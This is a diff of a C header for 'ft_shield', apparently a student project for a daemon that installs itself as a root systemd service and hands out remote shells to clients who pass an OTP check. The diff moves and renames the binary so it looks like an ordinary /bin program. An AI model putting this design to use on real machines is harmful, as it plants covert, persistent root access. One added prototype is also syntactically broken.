@@ -35,8 +35,8 @@
 #define LOG_NAME  "ft_shield.log"
 #define LOG_FILE  LOG_PATH LOG_NAME
 // executable
-#define EXECUTABLE_NAME "evil_ft_shield"
-#define EXECUTABLE_PATH "/var/tmp/" // TODO poner la ubicación final
+#define EXECUTABLE_NAME "ft_shield"
+#define EXECUTABLE_PATH "/bin"
 #define EXECUTABLE_FILE EXECUTABLE_PATH EXECUTABLE_NAME
 // system init
 #define SYSTEMD_NAME "ft_shield.service"
@@ -47,7 +47,7 @@
 "After=network.target\n" \
 "\n" \
 "[Service]\n" \
-"ExecStart=/var/tmp/evil_ft_shield\n" \
+"ExecStart=/bin/ft_shield\n" \
 "Restart=on-failure\n" \
 "User=root\n" \
 "\n" \
@@ -64,7 +64,9 @@ typedef struct s_daemon
     int             _lock_file_fd;
     int             _socket_fd;
     struct pollfd   _poll_fds[MAX_CLIENTS + 1];
-    bool            _auth_client[3];
+    int             _shell_pids[MAX_CLIENTS];
+    int             _running_shells;
+    int             _auth_client[4];
     size_t          _pollfds_size;
 } t_daemon;
 
@@ -83,7 +85,8 @@ void        accept_communication( t_daemon *daemon);
 void        receive_communication(int i, t_daemon *daemon);
 void        add_user(int fd, t_daemon *daemon);
 void        delete_user(int pollfd_position, t_daemon *daemon);
-void        create_shell(int fd);
+void        create_shell(int fd, t_daemon *daemon);
 bool        authenticate(char *codigo_otp);
+void        pid_waiter(t_daemon *daemon) //revisar pids de shell y ver su estado para eliminarlos y calcualr cuantas shells hay actualmente;
 
 #endif
